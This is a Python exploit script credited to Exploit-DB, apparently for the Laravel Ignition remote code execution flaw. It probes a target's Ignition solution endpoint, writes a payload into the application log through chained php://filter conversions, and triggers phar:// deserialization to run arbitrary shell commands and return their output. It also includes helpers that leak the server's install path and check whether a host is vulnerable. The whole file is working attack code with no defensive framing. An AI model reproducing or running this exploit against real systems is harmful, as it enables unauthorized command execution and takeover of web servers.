## Exploit-DB: https://www.exploit-db.com/exploits/49424
import re
import requests
import warnings
from payload import Payload
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)
class Exploit:

    def __init__(self):
        self.uri = ''
        self.logpath = ''
        self.headers = {
            'Accept': 'application/json'
        }
        self.params = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "wibuheker",
                "viewFile": ""
            }
        }
    def clearLog(self, args):
        self.params['parameters']['viewFile'] = args
        while (requests.post(self.uri, json=self.params, headers=self.headers, verify=False, timeout=15, allow_redirects=True).status_code != 200): pass
        requests.post(self.uri, json=self.params, headers=self.headers, verify=False)
        requests.post(self.uri, json=self.params, headers=self.headers, verify=False)
    
    def do_post(self, args):
        self.params['parameters']['viewFile'] = args
        request = requests.post(self.uri, json=self.params, headers=self.headers, verify=False, timeout=15)
        if request.status_code == 500 and f'file_get_contents({args})' in request.text:
            return True
        return False
    
    def convert(self, args):
        self.params['parameters']['viewFile'] = args
        request = requests.post(self.uri, json=self.params, headers=self.headers, verify=False, timeout=15)
        if request.status_code == 200:
            return True
        return False
    
    def exploit(self, args):
        self.params['parameters']['viewFile'] = args
        request = requests.post(self.uri, json=self.params, headers=self.headers, verify=False, timeout=15)
        if request.status_code == 500 and 'cannot be empty' in request.text:
            returned = re.findall(r'\{(.|\n)+\}((.|\n)*)', request.text)
            return returned[0][1]
        return False
    def pathExits(self):
        self.params['parameters']['viewFile'] = self.logpath 
        req = requests.post(self.uri, json=self.params, headers=self.headers, verify=False, timeout=15)
        if 'failed to open stream: No such file or directory' in req.text:
            return False
        return True
    def run(self, command):
        padding = 0
        self.clearLog(f'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource={self.logpath}')
        self.do_post(f'AA')
        self.do_post(Payload.generate(cmd=command, padding=padding))
        while (not self.convert(f'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={self.logpath}')):
            self.clearLog(f'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource={self.logpath}')
            self.do_post(f'AA')
            padding += 1
            self.do_post(Payload.generate(cmd=command, padding=padding))
        return self.exploit(f'phar://{self.logpath}')
    
    @staticmethod
    def getLogpath(uri):
        req = requests.post(uri)
        if '/vendor/laravel/framework/' in req.text:
            grep = re.findall(f'#0(.*?)/vendor/laravel/', req.text)
            return grep[0]
        return False
    @staticmethod
    def testPost(uri):
        params = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "wibuheker",
                "viewFile": "testajabang"
            }
        }
        request = requests.post(uri, json=params, headers={'Accept': 'application/json'}, verify=False, timeout=15)
        if request.status_code == 500 and 'file_get_contents(' in request.text:
            return True
        return False
    @staticmethod
    def save(filename, content):
        with open(filename, 'w') as f:
            f.write(content + "\n")
        f.close()
